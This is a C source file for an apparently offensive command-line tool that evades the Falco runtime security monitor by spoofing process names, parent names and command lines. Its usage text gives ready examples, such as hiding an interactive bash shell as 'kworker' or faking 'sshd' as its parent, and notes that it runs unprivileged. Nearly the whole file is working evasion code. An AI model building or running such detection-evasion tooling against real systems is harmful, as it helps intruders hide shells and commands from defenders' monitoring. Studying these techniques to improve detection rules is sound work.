#define _GNU_SOURCE
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/sendfile.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

static void set_comm(const char *name)
{

    if (prctl(PR_SET_NAME, name, 0, 0, 0) < 0)
        perror("prctl PR_SET_NAME");
}

static void get_comm(char *out, size_t sz)
{
    if (prctl(PR_GET_NAME, out, 0, 0, 0) < 0) {
        strncpy(out, "(unknown)", sz - 1);
    }
    out[sz-1] = '\0';
}

static void show_proc_info(pid_t pid)
{
    char comm[64] = {}, cmdline[512] = {}, exe[256] = {};

    char path[128];
    snprintf(path, sizeof(path), "/proc/%d/comm", (int)pid);
    FILE *f = fopen(path, "r");
    if (f) { fgets(comm, sizeof(comm), f); fclose(f); comm[strcspn(comm, "\n")] = '\0'; }

    snprintf(path, sizeof(path), "/proc/%d/exe", (int)pid);
    ssize_t n = readlink(path, exe, sizeof(exe)-1);
    if (n > 0) exe[n] = '\0';

    snprintf(path, sizeof(path), "/proc/%d/cmdline", (int)pid);
    int fd = open(path, O_RDONLY);
    if (fd >= 0) {
        n = read(fd, cmdline, sizeof(cmdline)-1); close(fd);
        if (n > 0) {
            cmdline[n] = '\0';
            for (ssize_t i = 0; i < n-1; i++)
                if (cmdline[i] == '\0') cmdline[i] = ' ';
        }
    }

    printf("  pid=%-6d  comm=%-18s  exe=%-40s  cmdline=%s\n",
           (int)pid, comm, exe, cmdline);
}

static void cmd_setname(const char *fake_name, char *const exec_argv[])
{
    printf("[*] setname: will set comm='%s' before exec\n", fake_name);

    pid_t pid = fork();
    if (pid < 0) { perror("fork"); return; }

    if (pid == 0) {

        set_comm(fake_name);

        execvp(exec_argv[0], exec_argv);
        perror("execvp");
        _exit(1);
    }

    int status;
    waitpid(pid, &status, 0);

    printf("[*] Falco would have evaluated:\n");
    printf("  proc.name = '%s' (spoofed)\n", fake_name);
    printf("  proc.exepath = (real path of %s)\n", exec_argv[0]);
    printf("  rule 'proc.name in (bash, sh, ...)' → MISS if fake_name not in list\n");
}

static void cmd_fakeparent(const char *parent_comm, char *const child_argv[])
{

    printf("[*] fakeparent: intermediate parent with comm='%s'\n", parent_comm);

    pid_t ppid = fork();
    if (ppid < 0) { perror("fork"); return; }

    if (ppid == 0) {

        set_comm(parent_comm);

        pid_t child = fork();
        if (child < 0) _exit(1);

        if (child == 0) {

            char comm[32];
            get_comm(comm, sizeof(comm));
            execvp(child_argv[0], child_argv);
            _exit(1);
        }

        int st; waitpid(child, &st, 0);
        _exit(0);
    }

    int status;
    waitpid(ppid, &status, 0);

    printf("[*] grandchild executed with proc.pname = '%s'\n", parent_comm);
    printf("    Falco's pname-based rules saw '%s' as the parent\n", parent_comm);
}

static void cmd_argv(const char *fake_argv0, char *const real_argv[])
{

    printf("[*] argv spoof: fake argv[0]='%s'\n", fake_argv0);
    printf("[*] real executable: %s\n", real_argv[0]);

    int i, n = 0;
    while (real_argv[n]) n++;
    char **fargv = calloc((size_t)n + 1, sizeof(char *));
    fargv[0] = (char *)fake_argv0;
    for (i = 1; i < n; i++) fargv[i] = real_argv[i];
    fargv[n] = NULL;

    pid_t pid = fork();
    if (pid < 0) { perror("fork"); free(fargv); return; }
    if (pid == 0) {
        execvp(real_argv[0], fargv);
        _exit(1);
    }

    free(fargv);
    int status;
    waitpid(pid, &status, 0);

    printf("[*] Falco saw proc.cmdline starting with '%s'\n", fake_argv0);
}

static void cmd_clone_parent(const char *trusted_comm, char *const cmd_argv[])
{

    printf("[*] clone-parent: grandchild sees pname='%s'\n", trusted_comm);

    pid_t top = fork();
    if (top < 0) { perror("fork"); return; }
    if (top == 0) {
        set_comm(trusted_comm);

        pid_t mid = fork();
        if (mid < 0) _exit(1);
        if (mid == 0) {

            execvp(cmd_argv[0], cmd_argv);
            _exit(1);
        }
        int st; waitpid(mid, &st, 0);
        _exit(0);
    }

    int status;
    waitpid(top, &status, 0);

    char mycomm[32];
    get_comm(mycomm, sizeof(mycomm));
    printf("[*] our comm: '%s' (unchanged)\n", mycomm);
    printf("[*] target's proc.pname was: '%s'\n", trusted_comm);
}

static void cmd_show(void)
{
    printf("[*] current process identity (what Falco sees):\n");
    show_proc_info(getpid());

    printf("\n[*] parent process identity (what child would inherit as pname):\n");
    show_proc_info(getppid());
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr,
            "usage:\n"
            "  %s show                          show this process as Falco sees it\n"
            "  %s setname    <name> <cmd...>    set comm before fork+exec\n"
            "  %s fakeparent <pname> <cmd...>   fake proc.pname for the child\n"
            "  %s argv       <fake0> <cmd...>   spoof proc.cmdline via argv[0]\n"
            "  %s clone-parent <pname> <cmd...> combined fake parent chain\n"
            "\nFalco fields manipulated:\n"
            "  proc.name    → prctl(PR_SET_NAME) (max 15 chars)\n"
            "  proc.pname   → parent's comm at time of fork\n"
            "  proc.cmdline → argv[] passed to execve\n"
            "\nexample: evade 'Terminal shell in container' (proc.name in shells_list)\n"
            "  %s setname kworker /bin/bash -i\n"
            "\nexample: evade parent-chain rules (proc.pname in trusted_parents)\n"
            "  %s fakeparent sshd /bin/sh -c 'id'\n"
            "\nrequires: nothing (unprivileged)\n",
            argv[0], argv[0], argv[0], argv[0], argv[0], argv[0], argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "show") == 0) {
        cmd_show();
        return 0;
    }

    if (argc < 4 && strcmp(argv[1], "show") != 0) {
        fprintf(stderr, "%s: need <name/pname> <cmd...>\n", argv[1]);
        return 1;
    }

    char **cmd = argv + 3;

    if      (strcmp(argv[1], "setname")      == 0) cmd_setname(argv[2], cmd);
    else if (strcmp(argv[1], "fakeparent")   == 0) cmd_fakeparent(argv[2], cmd);
    else if (strcmp(argv[1], "argv")         == 0) cmd_argv(argv[2], cmd);
    else if (strcmp(argv[1], "clone-parent") == 0) cmd_clone_parent(argv[2], cmd);
    else { fprintf(stderr, "unknown: %s\n", argv[1]); return 1; }
    return 0;
}
